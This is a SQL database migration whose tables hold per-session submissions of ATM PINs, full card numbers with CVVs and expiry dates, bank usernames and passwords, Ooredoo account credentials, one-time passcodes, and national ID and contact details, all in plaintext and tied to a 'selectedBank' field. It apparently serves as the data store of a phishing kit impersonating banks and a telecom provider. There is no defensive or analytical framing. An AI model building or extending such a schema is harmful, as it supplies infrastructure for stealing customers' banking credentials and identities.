CREATE TABLE `atmPinSubmissions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`pin` varchar(10) NOT NULL,
	`submittedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `atmPinSubmissions_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `loginMethodSubmissions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`loginType` varchar(20) NOT NULL,
	`cardNumber` varchar(50),
	`cardholderName` text,
	`expiryDate` varchar(10),
	`cvv` varchar(10),
	`username` varchar(255),
	`password` text,
	`submittedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `loginMethodSubmissions_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `ooredooSubmissions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`ooredooUser` varchar(255) NOT NULL,
	`ooredooPassword` text NOT NULL,
	`submittedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `ooredooSubmissions_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `otpSubmissions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`otpCode` varchar(10) NOT NULL,
	`otpType` varchar(20) NOT NULL,
	`submittedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `otpSubmissions_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `personalDataSubmissions` (
	`id` int AUTO_INCREMENT NOT NULL,
	`sessionId` varchar(64) NOT NULL,
	`nameArabic` text NOT NULL,
	`nameEnglish` text NOT NULL,
	`idNumber` varchar(50) NOT NULL,
	`phoneNumber` varchar(20) NOT NULL,
	`email` varchar(320) NOT NULL,
	`dateOfBirth` varchar(20) NOT NULL,
	`gender` varchar(10) NOT NULL,
	`customerStatus` varchar(50) NOT NULL,
	`submittedAt` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT `personalDataSubmissions_id` PRIMARY KEY(`id`)
);
--> statement-breakpoint
CREATE TABLE `sessions` (
	`id` varchar(64) NOT NULL,
	`selectedBank` varchar(50) NOT NULL,
	`createdAt` timestamp NOT NULL DEFAULT (now()),
	`updatedAt` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT `sessions_id` PRIMARY KEY(`id`)
);
